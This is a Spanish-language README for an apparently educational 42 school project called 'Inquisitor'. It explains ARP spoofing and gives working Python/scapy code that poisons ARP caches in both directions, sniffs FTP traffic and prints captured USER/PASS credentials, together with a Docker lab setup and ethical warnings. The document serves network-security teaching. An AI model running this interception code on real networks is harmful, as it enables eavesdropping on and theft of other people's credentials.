# 🔍 Inquisitor - Envenenamiento ARP y Análisis de Red

**Versión**: 1.00  
**Tipo de Proyecto**: Seguridad de Redes - ARP Spoofing  
**Protocolo Objetivo**: Interceptación de Tráfico FTP

## 📋 Tabla de Contenidos
- [Objetivo](#objetivo)
- [¿Qué es el Envenenamiento ARP?](#arp)
- [Especificaciones del Programa](#especificaciones)
- [Requisitos Técnicos](#requisitos)
- [Funcionalidades Obligatorias](#funcionalidades)
- [Configuración del Entorno y Uso](#configuracion)
- [Novedades: Tutorial e Interfaz](#novedades)

---

<a name="objetivo"></a>
## 🎯 Objetivo

Implementar un programa que realice **Envenenamiento ARP** (también conocido como ARP Spoofing) para interceptar y analizar tráfico de red, específicamente conexiones FTP, demostrando vulnerabilidades a nivel de red en el modelo OSI.

---
<a name="arp"></a>

## 📖 ¿Qué es el Envenenamiento ARP?

### Contexto de Red
- Cada red local tiene una **puerta de enlace predeterminada** (router) que recibe tráfico externo y lo distribuye entre los nodos
- Los nodos se comunican usando **direcciones MAC** en la capa 2 (Enlace de Datos)
- El **protocolo ARP** mapea direcciones IP a direcciones MAC

### El Ataque
**Si un nodo de red puede suplantar la puerta de enlace**, puede:
- ✅ Tomar control del tráfico
- ✅ Interceptar comunicaciones
- ✅ Modificar paquetes
- ✅ Bloquear conexiones

### Usos Legítimos
El ARP spoofing también se usa legítimamente:
- Redirigir nuevas conexiones a páginas de registro en redes públicas (aeropuertos, cafeterías, hoteles)
- Modelado de tráfico de red y gestión de QoS
- Portales cautivos para autenticación

### Superficie de Ataque del Modelo OSI
Este proyecto explota vulnerabilidades de la **Capa 2 (Enlace de Datos)**:
```
Capa 7: Aplicación     ← FTP (protocolo objetivo)
Capa 6: Presentación
Capa 5: Sesión
Capa 4: Transporte     ← TCP
Capa 3: Red            ← IP
Capa 2: Enlace de Datos ← ARP (vector de ataque) ⚠️
Capa 1: Física
```

---
<a name="especificaciones"></a>

## 💻 Especificaciones del Programa

### Nombre del Ejecutable
```
inquisitor
```

### Plataforma
- **Solo Linux** (exclusivo)
- Debe ejecutarse en contenedor o máquina virtual
- Requiere permisos de bajo nivel (raw sockets)

### Lenguaje
Cualquier lenguaje que implemente **libpcap**:
- C/C++
- Python (scapy)
- Go
- Rust

### Librería Requerida
**libpcap** (o bindings del lenguaje):
- Para sniffing de paquetes
- Para inyección de paquetes
- Para manipulación de interfaces de red

---

<a name="requisitos"></a>
## ⚙️ Requisitos Técnicos

### Parámetros de Línea de Comandos

**Mínimo 4 parámetros requeridos:**
```bash
./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>
```

| Parámetro | Descripción | Ejemplo |
|-----------|-------------|---------|
| `IP-src` | Dirección IP fuente | `192.168.1.1` |
| `MAC-src` | Dirección MAC fuente | `aa:bb:cc:dd:ee:ff` |
| `IP-target` | Dirección IP objetivo | `192.168.1.100` |
| `MAC-target` | Dirección MAC objetivo | `11:22:33:44:55:66` |

**Parámetro opcional adicional (bonus cumplido):**
```bash
./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target> -v
```
El modo verboso intercepta e imprime **toda la capa de comandos** subyacentes del protocolo FTP, incluidas las sentencias `USER` y `PASS` en texto plano exponiendo así las contraseñas utilizadas por el cliente víctima.

### Requisitos de Protocolo
- ✅ **Solo IPv4** (no se requiere soporte IPv6)
- ✅ **Envenenamiento ARP** en ambas direcciones (full duplex)
- ✅ Monitorización y análisis de **tráfico FTP**

### Gestión de Errores
- ❌ **Nunca crashear** inesperadamente
- ✅ Validar todos los parámetros de entrada
- ✅ Manejar todos los errores con elegancia
- ✅ Proporcionar mensajes de error significativos

---

<a name="funcionalidades"></a>
## 🛠️ Funcionalidades Obligatorias

### 1. Envenenamiento ARP Bidireccional (Full Duplex)

Envenenar caché ARP en **ambas direcciones**:

```
┌─────────┐         ┌──────────────┐         ┌─────────┐
│ Cliente │◄───────►│  Inquisitor  │◄───────►│ Puerta  │
│ Objetivo│         │  (atacante)  │         │ Enlace  │
└─────────┘         └──────────────┘         └─────────┘
     ▲                      │                      ▲
     │                      │                      │
     └──────────────────────┴──────────────────────┘
         Todo el tráfico fluye a través del atacante
```

**Implementación:**
- Enviar respuestas ARP falsificadas al objetivo (cliente)
- Enviar respuestas ARP falsificadas a la puerta de enlace (router)
- Mantener el envenenamiento continuamente

### 2. Restauración de Tabla ARP

Al detener el ataque (CTRL+C):
- **Restaurar automáticamente** las tablas ARP originales
- Enviar respuestas ARP correctas tanto al objetivo como a la puerta de enlace
- Salida limpia sin dejar la red en estado envenenado

### 3. Monitorización de Tráfico FTP

Monitorizar y mostrar comunicación FTP en tiempo real:
- Mostrar **nombres de archivos** siendo transferidos
- Capturar tráfico entre cliente FTP y servidor
- Mostrar comandos FTP relevantes

**Ejemplo de Salida:**
```
[*] Envenenamiento ARP activo...
[+] FTP: Archivo subido: documento.pdf
[+] FTP: Archivo descargado: backup.zip
[+] FTP: Listado de directorio solicitado
[+] FTP: Archivo eliminado: temp.txt
```

### 4. Gestión Robusta de Errores
- Validar formato de dirección IP
- Validar formato de dirección MAC
- Comprobar interfaz de red válida
- Manejar errores de permisos (requiere root/sudo)
- Manejo elegante de interrupciones de red

---
<a name="configuracion"></a>

## 🐳 Configuración del Entorno y Uso

### Despliegue Basado en Contenedor

Se han creado archivos de entorno completamente aislados en forma de simulación mediante Docker Compose:

*   **`attacker`**: Contenedor equipado con dependencias de red, iptables, e iproute instaladas, usado para ejecutar `inquisitor` gracias al parámetro `NET_ADMIN`.
*   **`ftp_server`**: Un contenedor servidor FTP clásico para pruebas (`fauria/vsftpd`). 
*   **`ftp_client`**: Un cliente Linux Debian (versión `bullseye-slim`) más robusto para enviar peticiones usando herramientas nativas que el atacante (tú) vas interceptar.

### Pruebas (Cómo Empezar)

1. En el directorio principal, ejecuta `make` o `make up` para construir la red virtual y levantar el servidor y cliente de golpe.
2. Inicia un shell interactivo dentro del contenedor atacante:  
   `docker exec -it inquisitor_attacker bash`
3. Ejecuta el script dentro del contenedor contra las IP generadas en tu docker network:  
   `./inquisitor 10.0.0.30 <client_mac> 10.0.0.20 <server_mac> -v`  
   *(puedes obtener la MAC de tu cliente y servidor con el comando `arp -a` tras hacerles un ping)*.
4. En otra terminal, accede como cliente FTP y realiza peticiones; verás en la terminal atacante las trazas interceptadas limpiamente.

Para la limpieza de contenedores remanentes:
`make fclean` o `make down`

---

<a name="novedades"></a>
## ✨ Novedades: Tutorial Interactivo y Documentación Accesible

En nuestras últimas implementaciones, hemos dotado al proyecto de un gran salto en accesibilidad y facilidad de corrección:

1. **📜 Código Totalmente Comentado (en Español)**:
   Todos los ficheros fuente (`inquisitor.py`, `Dockerfile`, `docker-compose.yml`, `Makefile`, etc.) han sido minuciosamente comentados línea a línea o por bloques lógicos. Explicando en profundidad conceptos como el _IP Forwarding_, por qué es necesario enviar paquetes falsos en bucle, y el uso de filtros pasivos en el puerto 21 para atrapar credenciales FTP. Ideal para que cualquier persona, independientemente de sus conocimientos previos en redes, logre comprender la topología del ataque y el protocolo subyacente.

2. **🎓 Tutorial Interactivo Automatizado**:
   Se ha añadido el script `tutorial.sh` al proyecto. Este script sirve como guía interactiva paso a paso y evalúa el proyecto frente a todos los mandatories de forma automática:
   - Extrae fragmentos de tu código dinámicamente (`grep`) justificando explícitamente en qué líneas cumples los requerimientos de validación de la norma del subject.
   - Te guía con colores y directrices para dividirte en terminales y orquestar a la víctima y al atacante simultáneamente.
   - Demuestra de forma innegable el cumplimiento tanto de la parte **Mandatory** (intercepción transparente e imprimir archivos subidos o bajados) como de la parte **Bonus** (impresión del tráfico crudo y contraseñas mediante el flag `-v`).
   
   > **Para iniciarlo simplemente ejecuta:**  
   > `./tutorial.sh` en tu terminal base.

## 📝 Guía de Implementación

### Paso 1: Estructura de Paquete ARP

```python
from scapy.all import ARP, Ether, send

def crear_paquete_arp(ip_objetivo, mac_objetivo, ip_falsa, mac_falsa):
    """Crear paquete ARP reply falsificado"""
    arp = ARP(
        op=2,  # ARP Reply
        psrc=ip_falsa,  # IP falsificada
        hwsrc=mac_falsa,  # MAC falsificada
        pdst=ip_objetivo,  # IP objetivo
        hwdst=mac_objetivo  # MAC objetivo
    )
    return arp
```

### Paso 2: Envenenamiento Bidireccional

```python
import time
import signal
import sys

def envenenar_arp(ip_objetivo, mac_objetivo, ip_gateway, mac_gateway, interfaz):
    """Envenenar continuamente caché ARP en ambas direcciones"""
    try:
        while True:
            # Envenenar objetivo (decirle que gateway somos nosotros)
            send(ARP(op=2, psrc=ip_gateway, hwsrc=get_if_hwaddr(interfaz),
                     pdst=ip_objetivo, hwdst=mac_objetivo), verbose=False)
            
            # Envenenar gateway (decirle que objetivo somos nosotros)
            send(ARP(op=2, psrc=ip_objetivo, hwsrc=get_if_hwaddr(interfaz),
                     pdst=ip_gateway, hwdst=mac_gateway), verbose=False)
            
            time.sleep(2)  # Repetir cada 2 segundos
    except KeyboardInterrupt:
        restaurar_arp(ip_objetivo, mac_objetivo, ip_gateway, mac_gateway)
        sys.exit(0)
```

### Paso 3: Restauración ARP

```python
def restaurar_arp(ip_objetivo, mac_objetivo, ip_gateway, mac_gateway):
    """Restaurar tablas ARP originales"""
    print("\n[*] Restaurando tablas ARP...")
    
    # Restaurar tabla ARP del objetivo
    send(ARP(op=2, psrc=ip_gateway, hwsrc=mac_gateway,
             pdst=ip_objetivo, hwdst=mac_objetivo), count=5, verbose=False)
    
    # Restaurar tabla ARP del gateway
    send(ARP(op=2, psrc=ip_objetivo, hwsrc=mac_objetivo,
             pdst=ip_gateway, hwdst=mac_gateway), count=5, verbose=False)
    
    print("[+] Tablas ARP restauradas")
```

### Paso 4: Sniffing de Tráfico FTP

```python
from scapy.all import sniff, TCP, Raw

def procesar_paquete_ftp(paquete):
    """Procesar paquetes FTP y extraer nombres de archivos"""
    if paquete.haslayer(TCP) and paquete.haslayer(Raw):
        payload = paquete[Raw].load.decode('utf-8', errors='ignore')
        
        # Comandos FTP para operaciones con archivos
        if 'STOR ' in payload:
            nombre_archivo = payload.split('STOR ')[1].strip()
            print(f"[+] FTP: Archivo subido: {nombre_archivo}")
        elif 'RETR ' in payload:
            nombre_archivo = payload.split('RETR ')[1].strip()
            print(f"[+] FTP: Archivo descargado: {nombre_archivo}")
        elif 'DELE ' in payload:
            nombre_archivo = payload.split('DELE ')[1].strip()
            print(f"[+] FTP: Archivo eliminado: {nombre_archivo}")

def sniffear_trafico_ftp(interfaz):
    """Sniffear y analizar tráfico FTP"""
    print("[*] Monitorizando tráfico FTP...")
    sniff(iface=interfaz, filter="tcp port 21", prn=procesar_paquete_ftp)
```

### Paso 5: Programa Principal

```python
def main():
    if len(sys.argv) < 5:
        print("Uso: ./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]")
        sys.exit(1)
    
    ip_gateway = sys.argv[1]
    mac_gateway = sys.argv[2]
    ip_objetivo = sys.argv[3]
    mac_objetivo = sys.argv[4]
    verbose = '-v' in sys.argv
    
    # Validar entradas
    if not validar_ip(ip_gateway) or not validar_ip(ip_objetivo):
        print("Error: Dirección IP inválida")
        sys.exit(1)
    
    if not validar_mac(mac_gateway) or not validar_mac(mac_objetivo):
        print("Error: Dirección MAC inválida")
        sys.exit(1)
    
    # Habilitar reenvío IP
    habilitar_reenvio_ip()
    
    # Iniciar envenenamiento ARP en hilo separado
    hilo_envenenamiento = threading.Thread(
        target=envenenar_arp,
        args=(ip_objetivo, mac_objetivo, ip_gateway, mac_gateway, "eth0")
    )
    hilo_envenenamiento.start()
    
    # Sniffear tráfico FTP
    sniffear_trafico_ftp("eth0")
```

---

## 🧪 Pruebas

### Requisitos de la Suite de Pruebas

Preparar pruebas específicas para conexiones FTP:

### Escenario de Prueba 1: Subida de Archivo FTP
```bash
# En la máquina objetivo
ftp <servidor-ftp>
> put archivo_prueba.txt
```
**Esperado**: Inquisitor muestra "FTP: Archivo subido: archivo_prueba.txt"

### Escenario de Prueba 2: Descarga de Archivo FTP
```bash
ftp <servidor-ftp>
> get documento.pdf
```
**Esperado**: Inquisitor muestra "FTP: Archivo descargado: documento.pdf"

### Escenario de Prueba 3: Restauración de Tabla ARP
```bash
# Comprobar ARP antes del ataque
arp -a

# Ejecutar inquisitor
./inquisitor 192.168.1.1 aa:bb:cc:dd:ee:ff 192.168.1.100 11:22:33:44:55:66

# CTRL+C para detener

# Comprobar ARP después (debería estar restaurado)
arp -a
```

---

## 🏆 Funcionalidades Bonus

Los bonus **SOLO** se evaluarán si la parte obligatoria está **PERFECTA**.

### Modo Verbose (`-v`)

Mostrar **TODO el tráfico FTP**, no solo nombres de archivos:

```bash
./inquisitor 192.168.1.1 aa:bb:cc:dd:ee:ff 192.168.1.100 11:22:33:44:55:66 -v
```

**Capturas adicionales:**
- Credenciales de login FTP (usuario/contraseña)
- Todos los comandos FTP (LIST, CWD, PWD, etc.)
- Respuestas del servidor
- Sesión completa desde login hasta logout

**Ejemplo de Salida:**
```
[*] Envenenamiento ARP activo...
[*] Modo verbose habilitado
[+] FTP: USER admin
[+] FTP: PASS password123
[+] FTP: 230 Usuario conectado
[+] FTP: CWD /documentos
[+] FTP: LIST
[+] FTP: RETR confidencial.pdf
[+] FTP: Archivo descargado: confidencial.pdf
[+] FTP: QUIT
```

---

## 📦 Estructura del Proyecto

```
04_Inquisitor_Network/
├── README.md
├── .gitignore
├── en.subject.pdf
├── inquisitor*             # Ejecutable principal
├── Dockerfile              # Definición de contenedor
├── docker-compose.yml      # Orquestación de contenedor
├── Makefile                # Configuración automática
├── test_ftp.sh             # Suite de pruebas FTP
├── requirements.txt        # Dependencias
└── [archivos fuente]       # Tu implementación
```

---

## ⚠️ Consideraciones Legales y Éticas

### ⚠️ **ADVERTENCIA: ESTA ES UNA HERRAMIENTA DE HACKING**

**Uso Legal Solamente:**
- Solo usar en redes **de tu propiedad**
- Solo usar en **pruebas de penetración autorizadas**
- Obtener **permiso por escrito** antes de realizar pruebas
- Nunca usar en redes sin autorización

**El uso no autorizado es ILEGAL y puede resultar en:**
- Persecución criminal
- Demandas civiles
- Multas y prisión
- Prohibición de red

### Directrices Éticas
1. **Permiso**: Siempre obtén autorización explícita
2. **Alcance**: Mantente dentro de los límites de prueba autorizados
3. **Divulgación**: Reporta vulnerabilidades de forma responsable
4. **Educación**: Usar para aprender, no para propósitos maliciosos

### Propósito Educativo
Este proyecto es para **propósitos educativos** para comprender:
- Vulnerabilidades de protocolo de red
- Ataques Man-in-the-Middle
- Debilidades del protocolo ARP
- Fundamentos de seguridad de red

---

## 📚 Recursos

### Protocolos y Estándares
- **ARP**: RFC 826
- **FTP**: RFC 959
- **IPv4**: RFC 791

### Herramientas y Librerías
- **libpcap**: Librería de captura de paquetes
- **Scapy** (Python): Manipulación de paquetes
- **Wireshark**: Analizador de protocolo de red
- **tcpdump**: Analizador de paquetes de línea de comandos

### Recursos de Aprendizaje
- Explicación de Envenenamiento ARP: [Wikipedia](https://en.wikipedia.org/wiki/ARP_spoofing)
- Ataques Man-in-the-Middle
- Fundamentos de seguridad de red

---

## 🎓 Resultados de Aprendizaje

Después de completar este proyecto, comprenderás:
- Mecánica y vulnerabilidades del protocolo ARP
- Técnicas de ataque Man-in-the-Middle
- Sniffing e inyección de paquetes
- Análisis de tráfico de red
- Estructura del protocolo FTP
- Seguridad de capa 2 del modelo OSI
- Principios de hacking ético

---

## ✅ Lista de Verificación para Evaluación

### Requisitos Obligatorios
- [ ] Funciona exclusivamente en Linux
- [ ] Acepta 4 parámetros requeridos correctamente
- [ ] Solo IPv4 (no IPv6)
- [ ] Nunca crashea inesperadamente
- [ ] Valida todos los parámetros de entrada
- [ ] Realiza envenenamiento ARP bidireccional
- [ ] Restaura tablas ARP al salir (CTRL+C)
- [ ] Muestra nombres de archivos FTP en tiempo real
- [ ] Incluye suite de pruebas FTP
- [ ] Si está en contenedor: Dockerfile/docker-compose + Makefile

### Requisitos Bonus
- [ ] Modo verbose (-v) implementado
- [ ] Muestra todo el tráfico FTP (no solo archivos)
- [ ] Intercepta credenciales de login FTP
- [ ] Muestra todos los comandos y respuestas FTP

---

**Nota**: Este proyecto forma parte de la Piscina de Ciberseguridad de 42. El enunciado completo está disponible en `en.subject.pdf`.

**Recuerda**: Usa este conocimiento de forma responsable. La experiencia en seguridad de redes conlleva obligaciones éticas.
